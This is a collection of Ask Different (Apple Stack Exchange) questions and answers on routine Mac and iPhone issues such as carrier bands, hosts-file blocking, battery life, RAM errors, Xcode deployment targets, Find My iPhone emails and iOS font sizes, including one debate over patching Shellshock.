bring-you-own-phone.\nFinally, an unlocked T-mobile iPhone 6 does not have CDMA bands at all. It only has GSM bands, since T-mobile uses only GSM cellular frequencies. So, it will not work with CDMA carriers like Verizon and Sprint,\nVerizon iPhones are the best choice since the 5 because they can be used with the most carriers in the U.S. I have a truly factory-unlocked 6, model 1586 (notice, not a Verizon). It's supposed to work with ANY carrier worldwide. But I haven't made sure if it will work with the odd balls of Verizon and Sprint. It does have both GSM and CDMA bands. I currently have it on AT&T.\n", "Q: software question about my apple ID I downloaded the IOS8 and all of the sudden my iphone5 needed restoring and i lost all of my data!!!!

If so, you can do the following to restore the backups:\n\n\n*\n\n*Go to Settings -> General -> Reset -> \"Erase All Content and Settings\"\n\n*It will ask if your sure, you are. \n\n*When the phone resets, it will ask if you would like to set this up as a new phone or restore from backup... tell it you want to restore.\n\n*it will ask if it's an iCloud or iTunes based backup, give the correct answer.\n\n*Wait until the restore is complete.\n\n\nNote that if you're doing this from iCloud, you'll need to be WiFi connected for quite some time for the restore to complete.\nIf you have NOT been syncing/backing up your iPhone, you may be out of luck :-(\nAlternatively, if this is really a question about how to recover your AppleID & Password, you'll need to follow these steps on Apple's website.\n", "Q: Internet stopped working on OS X 10.8.2 I have a MacBook Air with OS X 10.8.2 on it.

Copy and paste this code in Terminal (all one line)\nsudo /Applications/TextEdit.app/Contents/MacOS/TextEdit /etc/hosts\n\nThe hosts file will open in TextEdit. \nNotice the following lines and do not delete them under any circumstances:\n\n127.0.0.1           localhost\n255.255.255.255     broadcasthost\n::1                 localhost\nfe80::1%lo0         localhost\n\nYou should not have any further data here.\nCreate a new line directly under the last one shown above. Type the following, replacing the sample domain with the domain or IP\naddress you want to block:\n    127.0.0.1 sample.com www.sample.com\n\nContinue adding lines following the format in step 6 for each website you want to block. When you’re done, quit TextEdit and save the hosts file when prompted.\nBack in Terminal, run the following command to flush the computer’s DNS and put the new hosts file into effect. Or you can restart your Mac instead, if you prefer.\nsudo killall -HUP mDNSResponder\n\nThat’s all there is to it! Websites added to the hosts file will no longer be accessible from any user account on that Mac. \nIn your case look for the blocked IP's\n\n\n*\n\n*re-enable access to blocked websites, just repeat this process and\nremove the lines you added in the hosts file. Just remember not to\ndelete the original 4 lines!\n\n\nIn some cases the sshuttle (an VPN over ssh) cloud changed my /etc/hosts file.\n\nA: Happened to me too and i went to an appStoreGenuisBar.

Old user of this mac uses mac by electric all the time, so the life cycle till now just 3 cycles, but this computer has been used for 1.5 years.\nMy question is: if this mac is only 3 cycles, does this mean the battery still as good as new mac ? \nThanks :)\n\nA: I can speak from experience that the battery from by 2011 MBP 13' died (like only 10% of designed capacity left) after 56 cycles. It met a precipitous decline after a certain point. You may want you weigh your risk on the cost of replacing the battery. \n\nA: There are 3 main factors that age a battery.\nOne is of course the constant charging and discharging.- the more the faster.\nSecond one is less know and it is the shelf life. Even if you do not use a battery it will eventually die due to the internal currents / shelf life.\nThird and worse is Charging at all times in a elevated temperature environment.\nIn your case based on standards the battery is about 1/3 of its life based on age.\nSuggested reading material to learn more about batteries.\n\nA: In my experience one of the worst things for a battery is to leave it plugged in and not cycle it.  After doing this for a few months most batteries seem to become useless, sometimes not even keeping a charge for 5 minutes.\n", "Q: How can I use Family Sharing for Store purchases if I use a different Apple ID for purchases? A key feature of Apple's iCloud Family Sharing is the ability to share store purchases with invited family members. However, like many people, I use a different Apple ID for iCloud and Store purchases (ironically, primarily for the exact purpose of sharing among family).\nCan I use iCloud Family Sharing to share purchases if I use a different Apple ID for Store (iTunes, App Store, etc.) purchases? I understand that if I send invitations from the ID I use for purchases, I can share them; but there seems to be no way to do this, given that I use a different ID for iCloud on all my devices.\n\nA: This works exactly as one would expect it to: When you share from an iOS 8 device, purchases made with the Apple ID used on that device for purchases (iTunes, iBooks, AppStore) — even if that ID is different from the one used for iCloud (Photos, Mail, Contacts, Calendars) on that device — will be shared.\n", "Q: imac mid 2011 ram installation issues I just received 2x 4gb corsair 204 pin pc3-10600 ram sticks for my iMac 27\" mid 2011. I put them in and turned it on and received 3 short beeps, a pause, and repeat, which I think is the ram integrity error. I ended up taking out the ram that came with the machine (2x 2gb elpida pc3-10600 sticks) and then in worked. Why is this machine not accepting all 4 sticks together? I though you could put in unmatching ram without any problems. Any ideas?\n\nA: The mid-2011 iMac uses 4 - 204-pin PC3-10600 (1333 MHz) DDR3 SO-DIMM, so it seems that you've purchased the correct memory. The most likely cause of the problems you're seeing are improperly inserted- or faulty RAM. It can help to blow out the memory slots with compressed air and ensure that the RAM does not have grease or grime on any of the contacts prior to installation.\nOne method of debugging these problems is to try varying combinations of the RAM to determine which (if any) of the sticks is faulty. Try booting to 3 sticks and swap around. If one of the SO-DIMMs is faulty, you should be able to determine which it is and exchange it for another module.\n", "Q: How do I acquire SDKs to build target pre-8.0 iOS? I have installed XCode 6 and it came with the iOS 8 SDK but i need to test on devices still running 7.1 and cannot figure out how to get the iOS 7 SDK now without downloading an older version of XCode than I already have installed. Where can I find the previous SDKs and can I install them in my newer version of XCode?\n\nA: You don't need previous SDK to build for iOS7. Change Deployment Target in Xcode. \nHere are differences between Deployment Target and Base SDK: http://www.raywenderlich.com/42591/supporting-multiple-ios-versions-and-devices\n\nBase SDK refers to the newest version of iOS that is capable of running your app. To check which base SDK you are building your app against, simply open your project file in Xcode and check the setting under Build Settings -> Architecture(...)\nDeployment Target refers to the oldest version of iOS that is capable of running your project. To change your deployment target, open up your project file in Xcode and check the setting under Build Settings -> Deployment(...)\n\nBase SDK can be changed here:\n\nDeployment target can be changed here:\n\nCheck this answer to add earlier devices support.\n", "Q: Enable SNMP on Mac OS X I am trying to enable SNMP version 3 with a single ready-only user on Mac OS X 10.8.5 so that I can remotely monitor the health of the computer.

When I type ⌥ and some letter a special character usually shows up - this would be really useful except for the fact that I have no use for a lot of these characters.  How can I customize which characters are bound to these shortcuts?\n\nA: Create the folder ~/Library/KeyBindings/ and in it create a file called DefaultKeyBinding.dict and add whatever special character you need like so:\n{\n    \"~c\" = (insertText:, \"⌘\");\n}\n\nThis makes ⌥+c insert the symbol ⌘.

I've seen cases where people record audio with the headphones port, so is it possible to listen to audio with the microphone port? I do not have any torx or triwing screwdrivers right now so a headphone port replacement is not possible.\nThanks!\n\nA: Recent Macs (from 2012) have a headphone jack which also has a contact for a microphone, using the same contacts as the iPhone headset. That's how you can record from the headphone jack.\nUnfortunately, the microphone jack is not wired to support audio output, so there is no way to do it.\nIf you want to listen to headphones with your MacBook without a hardware repair, USB Audio devices are cheap and widely available. That would be the best way to go. \n", "Q: Can AirPort Express add speakers to a network without broadcasting a new wifi signal? I have a Time Capsule, which is 802.11ac capable. On wifi I get ~100mbps. \nI recently got some desktop speakers for my office. I like to move my laptop around the house, and I'd like to avoid having to plug the speakers in/out when I come into the office if possible. I'd also like my wife to be able to play music to the speakers, and her desk isn't close to them.\nOne option is the AirPort Express. I would use it in the office + plug my speakers into it, so I can just select the speakers as my output device when I come in. However, I wouldn't want my laptop to connect to the express's network, since it's only 802.11n, capable of ~50mbps.\nIs it possible for the AirPort express to make my speakers available on the main wifi network, but for my laptop to somehow \"ignore\" the extended network coming from the Express? Can I choose to only connect to the \"a/c part\" of the network? Can the two spectrum bands be used to solve this?\n\nA: Yep - just configure the express to \"Join a network\" instead of \"extending\" it.\n", "Q: very frequent CPU usage 100% for systemstats I have a MacBook Retina Pro 2013 version with 16GB ram and OS X 10.9.3.\nThis machine works just fine, except for just one problem; systemstats hits 100% CPU usage very frequently, at least 6 times a day.\nI've cleaned up the database file for my Spotlight and tried many solutions from Google search results.\nWhat is this systemstats and why is it using 100% CPU? I've heard that it indexes something but even so, does it have to use 100% CPU??\n\nA: systemstats profiles other processes. The information collected is used, for example, to populate the \"Apps Using Significant Energy\" section of the battery menu, and the Energy tab in Activity Monitor.\nIt is actively triggered by clicking on the battery menu, or opening Activity Monitor.\nYou can find more information on how to disable it in this article.\n\nA: Since I found a solution to this problem after suffering from it for a long time I provide my solution here:\nStory: Apple support told me to restart in safe mode to check if the problem would remain... It didn't. Their solution was to reinstall macOS which would mean a lot of unproductive time... But since the problem didn't appear in safe mode, it must had to do with some startup objects. One of them seems to trigger systemstats so often that it leads to high cpu and memory usage.\nSolution: So I grabbed the tool EtreCheck (free edition is enough) from the App Store which can list all startup files. I deleted all but those I definitely need... And voila after a restart the problem was gone. :D\nThere might be a list out there of all folders that contain startup objects... But I found it easer to use this tool. ;)\n", "Q: Create categories with iBooks (Mavericks) I need to regroup PDF which I have created into categories and to put them on my iPad. With mountain lion I used Calibre to create the categories and iTunes to put the PDF on my iPad as books. After the Mavericks update I realized that the books are now managed by IBooks. Unfortunately I can't use the categories created with Calibre in IBooks and I'm not able to create categories with IBooks. Do you have an idea to do that on Mavericks ?\n\nA: Go to: ~/Library/Containers/com.apple.BKAgentService/Data/Documents/iBooks/Books and make a backup copy the file Books.plist. \nDouble-click Books.plist when it should open in Property List Editor, assuming you have Xcode installed.\nExpand Root>Books and examine any item from Apple to see the format. Find the item containing your PDF (I'll call it 'itemX') and open it. If there is genre key all you have to do is edit the value field. If not, select 'itemX' and click on 'Add Child' at the top left to insert a new blank key/value pair.\nFill in 'genre' for the Key, String (the default) is correct for the Type, and for the Value insert the category you wish to associate with the PDF (you can invent your own).\nSave, restart your computer, open iBooks, and your PDF should now have the category you assigned it.\nNext you have to sync your iPad to your Mac with iTunes, but before you do that you need to delete the PDF files from your iPad, so that you have the 'new' versions with the changed categories. You may have to restart your iPad to see the changes.\nA bit of a faffle, but it works for me on Mavericks with my iPhone.\n", "Q: Is there a better way to put videos into the ipad? I have many videos on my computer that I want to put in my iPad. When I use iTunes, I have to manually click one video by one video to input the video into the iPad. Is there a way I can multiselect or highlight/drag and drop into the iPad? It's taking up a lot of time just to tick and untick (remove) them from the iPad. (I can't sync all because I have more than 16gb of videos and it cant fit my iPad).\nI've tried to google for ways to multi tick them, cntl + A doesn't work.\nAm I doing it wrong?\n\n\nA: I have created separate playlists for my devices (one for music and one for video). I just sync those playlists instead of manually maintaining the Sync Movies list. This is much easier since you can use the deeper integration of playlists in iTunes to manage the contents. (drag/drop, popup menu, ... etc).\n", "Q: Bind Ctrl+C to Copy function for eclipse on mac os x doesn't work I'm just moving my coding work from Windows to mac os x.

You will see a list of apps on the right.  Click the Plus sign and then select Eclipse for the app, type the menu item, type your new keyboard shortcut and you are done:\n\n\nA: If you are looking for a system-wide solution, you can simply remap the keyboard modifier keys, by going to System Preferences, Keyboard, and then \"Modifier Keys\", as shown in the screenshot below.\n", "Q: My email for my APPLE ID is deactivated what do I do?

I have a late 2013 MacBook Pro running in clamshell mode with an external 27 inch Apple monitor attached to it.\nI am logged in with two users, A and B. When I do a fast user switch from user A to user B, most windows that were open for user B when I last worked with that user are resized and some windows even change their position. Maximized windows are affected the most, typically they become less in height while staying the same in width. It feels as if initiating the user switch had temporarily changed the screen size or resolution, causing windows to change their size/position to adjust for the smaller screen size.\nIs this a known problem of Mac OS X in general, or of running a MacBook in clamshell mode? Has anyone experienced this as well and/or knows how to fix it?\nI can't remember when exactly I have noticed this problem for the first time. I am certain that it didn't exist with older versions of Mac OS X (i.e. 10.8 and older), although I must say that when I was last using Mac OS X 10.8 I also had a different MacBook and a different monitor. The general work environment MacBook/clamshell mode/external monitor has been the same for me for years.\n\nA: It's a known bug of the 10.9.3 update that has been reported last May. Sadly, it has yet to be fixed.\nPossible workarounds:\n\n\n*\n\n*Hide your windows before fast user switching. The app Notes is immune to the bug, so you can switch to that app and hide all other windows from there.\n\n*Use the app stay (cost $14.99, not checked)\nAnother workaround that works for some people (but not for me) is to kill the dock before fast user switching.

I would command-click on a URL in iTerm2 (Mac) and the app would seemingly lose focus but the link wouldn't open in a browser (Chrome, in my case). This used to work fine for me so I was a little confused and the other answers here didn't work for me.\nIt seemed to me that Chrome was \"trying\" to open but failing for some reason. I ran ps -ax | grep -i chrome to get a list of the Chrome or Chrome-related processes that were running and sure enough there was a process running that didn't correspond to an application that I was actively using.\nLong story short, I killed all the Chrome-related processes and command-click worked again.\n\nA: To use the normal mouse behavior in tmux you have to keep alt pressed. So click on the link while pressing cmd+alt. The same applies when selecting text.\n\n\nA: The top answer may work when using regular tmux, but it will not work when using iTerm2+tmux integration with the -CC option. For Cmd+Click to use your \"Semantic History\" Profile Preference, you have to install iTerm2 Shell Integration. Also I have found it best to create a seperate .tmux.conf.iterm with tmux integration, then create aliases for creating and attaching integrated sessions.\nalias tcs=\"tmux -f ~/.tmux.conf.iterm -CC new -s\"\nalias tca=\"tmux -f ~/.tmux.conf.iterm -CC attach -t\"\n\nThe only think in my ~/.tmux.conf.iterm file is set-option -g default-terminal screen-256color\n", "Q: Does syncing iphone to a new computer erases notes linked to the gmail account?

It took a few boots (SMC, PRAM resets) with failures after reinstalling it before I could get a fresh install of OS X in and now I'll waiting to see if it starts up again.\nWould like to know if anyone else has had a SSD installed which has then interfered with the GPU? or is Apple feeding me a line?\n\nA: All resolved. MBP started playing up again without a few hours. GPU overheating and corrupting the display. \nTook it back to Apple again and this time they replace the logic board. MBP is now running noticeably cooler with no issues. Have reinstalled the SSD without any problems.\n", "Q: iTunes search API returns different app icons for 60x60 and 1024x1024 At first, I have to say that I am not sure whether I should ask this question on stackoverflow or on AskDifferent. I decided to use AskDifferent because this question is not programming-specific.\nMy question:\nI use the iTunes search API to get information about some apps. I use the iTunes lookup (http://itunes.apple.com/lookup?id=[some app id]) URL to get this information. The return dictionary contains two links for the app icon:  \n\n\n*\n\n*artworkUrl60  \n\n*artworkUrl512\nThe urls after the specific links point to the app icon.\nThe problem is that the image returned for the artworkUrl60 key is not the same as the image returned for the artworkUrl512 key.  \nExample: (I'm sorry that the second image is so much bigger, that's because it's the big artwork)\nVizzywig 4K\nartworkUrl60: \nartworkUrl512: \n\nA: Apps can have different artwork. Whilst Apple recommends simply scaling your app icon for iTunes Artwork, there's nothing preventing them from being different images.\n", "Q: Siri giving out incorrect info I have Verizon and Siri is giving me a fax number for a location rather than a phone number.

I would like my mac (OSX 10.9) to automatically mute during meetings.  I have a fully abstracted calendar, with several sub calendars. \nAny apps?\nAny Automator tricks?\n\nA: Step 1: Automator tasks\nCreate an Automator task, and save it (take note of the task file location). You probably want a couple Automator tasks in this case (one to mute and one to unmute).\nHere's a very basic mute script:\nset volume output volume 0\n\nAnd unmute:\nset volume output volume 100\n\nAfter you've created both Automator task files,\nStep 2: Scheduling with Calendar.app\nGo to Calendar, add an event when you want to mute.

The email notification feature was silently added as a feature way back in 2011. The email is sent sent when the device reconnects to a network.\nThere aren't options to turn this feature off.\n\nA: There is a flurry of the \"Find my phone\" issues today. \nI would assume it is a problem with Apple servers.\nI would suggest you turn the Find my phone off, wait for 1/2 hour and turn it on again (to reset).\nAlso it might be a bug in the iOS 8.01 so for now just disable it.\nTurn off \"Find My iPhone\" on your phone if you're using the feature. You can do this under Settings > iCloud > Find My iPhone.\n\nA: I just logged into my own phone to find it and received an email 10 minutes later...I think it's something new they are doing and there are probably some bugs to kink out while they do it...hope this helps...I am not concerned on my end anymore and will just wait and see if it happens again.\n\nA: No, I spent over an hour on the phone with apple today. They will notify you every single time you log into find my iphone from now on. It's quite annoying. The guy suggested we all log a complaint at apple.com/feedback to get them to stop the madness. \n\nA: Update Nov 2015 - El Capitan, iOS 9.1\nThis no longer appears to happen on each Find my iPhone access - just tested with both my own & my partner's phones - no email.\n", "Q: Prevent Mac from connecting to WiFi networks with same name as preferred network How can I prevent OS X (and ideally iOS devices as well) from connecting to a WiFi network which has the same name as one of my preferred networks, but isn't the same network?\nFor example say my favorite coffee shop has an open WiFi network named \"Free WiFi\" and that's fine, but so does neighbor who runs a proxy which changes all the images sent over HTTP to pictures of butts… hilarious… but[t] annoying.\n\nA: Obviously you joined neighbors network once upon a time.\nSince you have the \"Remember networks this computer has joined\" Enabled, it will remember it.\nFind it and delete it in networks - advanced, or just delete both and next time reconnect in the coffee shop, but do not connect to Free WiFi if showing up when at home.\nThe fact that they have the same name showing \"Free WiFi\" is only for us humans, the computer use BSSID to identify the stations.\n", "Q: Open source alternative to Adobe Edge Inspect I finally got around to trying out Adobe Edge Inspect today and was extremely disappointed.\nI found an alternative named Ghostlab but am trying to find a free or open-source alternative.\nAnyone have suggestions?\n\nA: Try this software: Muir\nIts what you search.\n", "Q: Settings app badge stuck at 1 after update to iOS 8.0.2 I updated from iOS 8.0 to iOS 8.0.2 on my iPhone 6 last night and noticed after the update completed that the Settings app shows a badge on my home screen even though there is no apparent update available in the app (including an iOS software update - which shows iOS 8.0.2 is installed and is the latest version).\nI saw a comment elsewhere (ios 8.0.1 - download completed but unable to install) implying this was seen with iOS 8.0.1 also and wondered if there is a way to reset the settings app badge or if this may be a bug that remains in iOS 8.0.2.\nUPDATE: As an additional data point the count on the settings badge inexplicably went from 1 to 5 today. I have not done a DFU restore, and may eventually resort to that, but for now would rather not go through that process and am hopeful a different fix is possible.\n\nA: I found a MacRumors thread complaining about the same thing, and more Google results about the same problem happening as far back as iOS 6.  It can apparently be fixed by a DFU restore, if you're willing to be that drastic.  Otherwise...wait for the next update.\n\nA: Have you tried reboot device? Turning off and on sometimes helps, also you can try restart only Settings.app in multitasking menu (double tap home button), find Settings and swype up or down\n\nA: A Device Factory Update (DFU) restore will repair this issue, but ensure you back up all important data before attempting to restore your device.\n\nA: You could also ignore it until the service that provides that update catches up and resets itself. \nI've seen several cases where a stuck badge in an off-by-one state just clears itself within 48 hours. Hiding that app in a folder and using siri/spotlight to launch it could help if you just can't stand the sight of the red circle.\nYou certainly don't need a DFU restore to clear that, a plain old restore or even erase all contents and settings (make sure your iCloud drive is backed up to a computer before doing so) would clear that update notification in all likelihood.\n\nA: This problem was resolved when I upgraded to iOS 8.1.2 (it was not fixed by 8.1.1 by the way).\n", "Q: Will recompiling bash to avoid Shellshock cause more harm than good I wasn't particularly worried about Shellshock until I learned that a malicious DHCP server may be able to exploit my DHCP client to run arbitrary code on my system.

And another is new macbook late retina 2013 using VGA onboard.\nI have googled but found no answer for comparison between those graphics. Does NVIDIA Graphics card is really stronger than core i5 VGA onboard (gen 4) ?\n@: sub question: about SSD, I see some benchmark, and see that SSD on 2013 is faster than SSD on 2012. Does this true ?\nThanks :) \n\nA: I found out here that the difference is very minor in gaming performances.\n\nNot to mention that the NVIDIA is a add on device while the Intel is integrated,resulting in more power consumption and graphics mode switching--that you might not want.\n", "Q: Is there a way to turn off email notifications with find my iPhone? Is there a way to turn off email notifications in find my iPhone?\n\nA: Currently, it's not possible to disable security notifications from iCloud services.\n\nA: No, it's not possible to do that.\n", "Q: How to disable special character selection popup when a key is held down There was a fix that worked with Lion in this question\ndefaults write -g ApplePressAndHoldEnabled -bool false \nbut that no longer seems to work in Mavericks. \nHas anyone figured out how to turn off the special character insertion popup that appears when you hold a key down in Mavericks?\n\nA: That command still works in Mojave, High Sierra and Mavericks — don't forget to reboot or logout/login after running the command.\n", "Q: How can I disconnect from all WiFi networks, yet leave WiFi antenna on so Internet Sharing will work properly? I would like to have my MacBook's Wi-Fi antenna on, but not be connected to any wireless network.

How can I make this work again?\n\nA: Change your network profile so that the preferred order has your thunderbolt connection at the top. This will make OSX use it over wifi even if a known wifi access point is available. \nWith a working internet connection just configure internet sharing and it should just work. \nI know from experience that this works, I have done it many times on snow leopard, should work the same way on later releases of osx. \n\nA: Go to the keychain and remove the passwords from your preferred networks.\nNow they will not auto connect.\nIf it is a public without password delete it.\n\nA: I found that the easy way to circumvent the auto-connection to other networks is to choose the Create Network... option that appears at the bottom of the WiFi drop-down.\nWho knew.\n\n", "Q: Will App preview video for iPhone 5 be the first item on iPhone 6(+) app store We have submitted an app preview video, recorded using an iPhone 5 along with our new binary.

Now they are receiving email messages that I am using the feature - which defeats the purpose of why I use it. Is there a way to turn off the email notifications?\n\nA: I'm reluctant to suggest this without knowing more about your situation, but taking your question at face value, you might want to look into Apple's Find My Friends app.\nIt has various settings that control who can see a phone's location and for how long they can see it. And with the Restriction settings within iOS you can set various settings and lock them down.\nThere are various articles online about parents using Find My Friends in a positive way with their children. For example:\nhttp://www.allprodad.com/articles/dads-and-teenagers/find-my-friends/\nhttp://dotcomplicated.co/content/2013/05/location-tracking-app/\n\nA: The way i am currently disabling this is by going to my children's email accounts and setting up rules to automatically delete this email when it comes in, its not perfect, but it will work for now.\n\nA: You may not turn that off, but you can switch iPhone Mail's new mail alert sound on or off:\nTap Settings on the Home screen.\nNow tap Sounds.\nSet New Mail to ON or OFF.\n\n", "Q: Why does my Mac start up immediately when plugged in, while my iPhone needs to start up? What causes the difference between my mac an my iPhone, where my Mac can boot and become useful immediately after being plugged in, while my phone needs a couple of minutes before it can even start to boot?\nIt's sometimes a bit frustrating, but in many cases, understanding the reason makes things like this less irritating to me.\n\nA: \nWhat causes the difference between my mac an my iPhone, where my Mac\n  can boot and become useful immediately after being plugged in, while\n  my phone needs a couple of minutes before it can even start to boot?\n\nThe primary source of power for a mobile device is it’s onboard battery. So it needs to be charged to some degree for the device to work.\nWhen you say your Mac I am going to assume it is a MacBook of some sort. Because in the case of laptops, the system is designed to either run off of the built-in battery power or off of direct AC current if it detects it is plugged into AC power.\n", "Q: Free iOS app in Pending Contract I recently renewed my iOS developer membership and noticed that my free app, which has been available in the store for a year, is now in Pending Contract status. There is no information whatsoever of what conditions have changed and what I need to renew/enter/accept. Note that my app is free, so I shouldn't need to enter bank details, tax information, etc.\nOn the Agreements, Tax, and Banking page I can see that the \"iOS Free Applications\" contract has expired but there is no button to renew it. Has this type of contract been discontinued? Do I really have to enter my bank details and tax number even for a free app?\n\nA: I found the solution:\nMy Apps -> Click on on the app -> Pricing\nChoose the Price Tier and dates and Save.\nThe status of the app immediately changes from Pending Contract to Ready for Sale.\nStill not clear why I had to redo it.\n", "Q: How to merge lecture notes from the web into a single PDF file I have some lecture notes which are located at:\nwww.mywebsite.com/Lecture1.pdf\nwww.mywebsite.com/Lecture2.pdf\netc\nIn Automator I currently have done the following:\n\n\n*\n\n*Get specified URLs\n\n*Download URLs\n\n*Combine PDF pages\n\n*Open Finder Items\n\n\nThis works, however, I have to manually type in all the URLs in step 1.

This question has generated a lot of downvoting on three SE sites so let me try to explain where it comes from.\nThe magnitude of the bash \"shellshock\" problem may turn out to be larger than anything since Y2K.\nHaving been part of a complete replacement of a large data center for Y2K, I'm alarmed at the panic that's been generated over shellshock (appropo name, btw). I'm concerned that rushing in quick fixes without extensive planning and testing is going to create far greater problems than the one we think we are facing.\nFor Y2K, we learned that the date code fixes were the easy part.\nThe massively more complex, error-prone, and unscheduled downtime-producing part was discovering and fixing/mitigating the failures in other software caused by the fixes. Some of these weren't discovered until the new systems had been in production for months. Despite a herculean effort, a few even resulted in organizational policy changes because they were too disruptive to fix.\nI am not suggesting that security-patching is unadvisable.\nHowever, in this case only, I have noticed a suspicious series of events culminating in not just another run-of-the-mill vulnerability, but one demanding massive updating of systems affecting virtually every person using a computer on the planet.\nThe vulnerability is real. But is the need for instant action?\nIt is this combination of factors that gives me pause...\nA fact...\n\n\n*\n\n*\"Bash is standard on Mac OS X and many Linux systems\"\nA timeline...\n\n\n*\n\n*Oct 2012 - \"Apple is added to the NSA’s list of penetrated servers\"\n\n*Dec 2013 - Apple Says It Has Never Worked With NSA...\n\n*Sep 19, 2014 - Likely that NSA has now demanded Apple's data and they are resisting\n\n*Sep 24, 2014 - US-CERT is aware of a Bash vulnerability affecting Unix-based operating systems such as Linux and Mac OS X\nRamifications...\n\n\n*\n\n*The Bash shellshock \"vulnerability\" has been a \"feature\" of Bash for 22 years. You'd think in all that time, in all those high-security environments that run Unix or Linux, someone would have worried about misuse.\n\n*Now, every installation of Bash in the world is about to be replaced.\n\n*Though Bash is open-source, few people actually take the time to study the code of such large and complex programs.\n\n*Bash is written in C, which supports embedded assembly-language code.

A reaction I regret. While factual, the \"conspiratorial\" tone produced a backlash that obscured anything of value. I leave it intact only so that the many good comments make sense.\nEnough new versions of most of the software involved have been released and well vetted by now that Shellshock may only still be of some concern to those running low-powered systems that must use older software. My alarm at the time was over the dangers of blindly removing 22 year old functionality from those systems with no analysis of the impact. Apparently, it turns out that the functionality was rarely, if ever, used.\n\nA: Yes, you should. Even in the very worst case, you're trading a known-exploitable version of a program for one that is theoretically exploitable only by whoever crafted a potential back door.\nTons of people know about the current problem and can use it against you right now, but presumably few people know about this hypothetical back door that may not even exist.\nThe decision seems like an easy one to me...at least if you're referring to the official patch released by the vendor of your OS. As for third-party patches, it comes down to a question of trust.\nPersonally, I will be patching, but I will be waiting for Apple, or at the very least for a trusted repository (Homebrew etc) to release a 3.2-series version of bash with the fix.\n", "Q: How many watts in iPhone LED flashlight I have a few 1 watt and 10 watt LED's laying around.

How font size is different in iPhone 6 / 6 Plus as compared to earlier iPhones (e.g. 5S)--given both the different screen size and DPI?\n\n\n*\n\n*Did the perceived* font sizes in system interfaces and built-in apps grow proportionally with screen size?\n[*] Perceived--i.e. as measured in milimeters/inches, not in pixels.\n\n*What are Apple's guidelines for app developers in terms of font sizes for 6/6+ as compared to earlier iPhones? How strictly are they enforced via app moderation (or any other means)? Should all apps effectively demonstrate the same font size for similar UI elements, or they are allowed to decide on the size individually? Should DisplayZoom and Dynamic Type be strictly supported by every app developer?\nThe reason I'm asking is that with iPhone 4 I struggle with a small font in most of the apps I use--so curious whether it will change if I switch to iPhone 6/+.\n\nA: Above all, text must be legible. If users can’t read the words in your app, it doesn’t matter how beautiful the typography is. When you adopt Dynamic Type in your app, you get:\n\n\n*\n\n*Automatic adjustments to letter spacing and line height for every font size\n\n*The ability to specify different text styles for semantically distinct blocks of text, such as Body, Footnote, or Headline\n\n*Text that responds appropriately to changes the user makes to text-size settings (including accessibility text sizes)\n\n\nMake sure all styles of a custom font are legible at different sizes. One way to do this is to emulate some of the ways iOS displays font styles at different text sizes. For example:\n\n\n*\n\n*Text should never be smaller than 11 points, even when the user chooses the extra-small text size. For comparison, the body style uses a font size of 17 points at the large size, which is the default text-size setting.\n\n*In general, font size and leading values differ by one point per text-size setting. Exceptions to this are the two caption styles, which use the same font size, leading, and tracking at the extra-small, small, and medium settings.\n\n*At the smallest three text sizes, tracking values are relatively large; at the largest three text sizes, tracking values are relatively tight.\n\n*The headline and body styles use the same font size. To distinguish it from the body style, the headline style uses a heavier weight.\n\n*Text in a navigation controller uses the same font size that body style text uses for the large setting (specifically, 17 points).\n\n*Text always uses either regular or medium weight; it doesn’t use light or bold.\n\n\niOS Human Interface Guidelines: Color and Typography\n\nA: The answer is Yes and No, depending on the app developers. I purchased iPhone 6 Plus for the hope that I can see bigger text. But apparently, not every user or developer thinks the same.\nOn my iPhone 6 Plus, I turned on the \"Zoom\" mode in \"Display & Brightness\" for my aging eyesight. What it does is to render the text bigger. It works very well in Apple's own apps. The fonts are large and crystal clear. But when it comes to third-party apps, it is a mixed bag. There are some apps that are optimized for 6/6+ that render fonts beautifully and in large-enough sizes. But there are a majority of others (alas) that claim to be 6/6+ optimized but effectively make the rendered font almost 50% smaller than before the update. For example, 1Password, Flipboard and Pocket rendered fonts much smaller after the update. I regretted the updates and have contacted the app developers. On the other hand, the iCab Mobile browser rendered fonts as it should, comparable to Apple's own apps.\nNow when I see the app developers release any 6/6+ optimized updates, I always take it with a grain of salt. A lot of them just change the resolution settings, put in higher-resolution graphics and call it an optimization. What they don't realize is that many people who buy these larger iPhones are expecting to use the bigger screen real estate to see bigger fonts, and the app developers need to tweak the app layout and design to achieve that. Some of the third-party so-called \"optimized\" apps display a lot of white spaces in their app now that the screen is bigger and their app is still using small fonts. For me, that is just stupid. Why I am buying a premium phone with a gigantic screen just to stare at white spaces? The app developers need to utilize that space for some useful purposes. I know some people would argue that they want to see more content and they prefer small fonts, but for my eyesight, a bigger font is not just a preference, it is a requirement. At least I want my apps to give me the option to increase font sizes. Or at the very least, these apps need to honor the global font settings that I made on my iPhone.\n\nA: Here is my own experience. For a context: I currently have iPhone 4 and iPad 2 (non-retina); I'm choosing between buying iPad Mini 3 and iPhone 6. I decided to choose iPad Mini; TLDR:\n\n\n*\n\n*several apps I use are more feature-rich in iPad version compared to iPhone version; it will take a year or two to appear on iPhone 6x (if at all): OmniFocus, Mail, Calendar\n\n*most critical apps (OmniFocus and Mail) already support DynamicType and, partially, Larger Text--which means I have a comfortable-size fonts on iPad Mini\n\n*I spend 2-3 hours per day with a portable screen, so larger is screen size  means more comfort for eyes.\n\n\nNow to my questions:\n\n\n*\n\n*Font sizes difference between 6x and earlier iPhones:\n\n\n*\n\n*iPhone 6 has two modes: Standard View vs Zoomed View:\n\n\n*\n\n*in Standard View, font sizes on iPhone are equal to iPhone 5x; larger screen space fits more content\n\n*in Zoomed View, font sizes on iPhone 6 are larger than on iPhone 5x, proportionally to the larger screen size; larger space fits exactly the same amount of content\n\n\n*To make things larger, there is Dynamic Type and Larger Text accessibility system settings (which allows even larger fonts). Support for them is not ubiquitous:\n\n\n*\n\n*Almost every system app support Dynamic Type (which is system-wide font size settings); about half of them also support Larger Text accessibility settings\n\n*for third-party apps, it all depends. Some support Dynamic Type only, others also support LargerText; yet others ignore system settings but have their own font size settings; yet others both ignore system settings and have no own font size settings. See \"Apple enforcement of font sizes\" below for details.\n\n\n*To compare Dynamic Type system settings between 6 and earlier iPhones:\n\n\n*\n\n*at Standard View: largest font on earlier iPhone is visually equal to \"one before largest\" on iPhone 6; the smallest font on earlier iPhone is equal to smallest on iPhone 6\n\n*at Zoomed View: largest font on earlier iPhone is visually equal to \"middle\" setting on iPhone 6\n\n\n\n*Apple enforcement of font sizes:\n\n\n*\n\n*with very few exceptions, support \"Display Zoom: Zoomed\" affects all of the (non-fullscreen) apps, built-in and third-party\n\n*Standard View vs Zoomed view seems to work equally for all (non-fullscreen) apps\n\n*support of Dynamic Type / Larger Size system settings 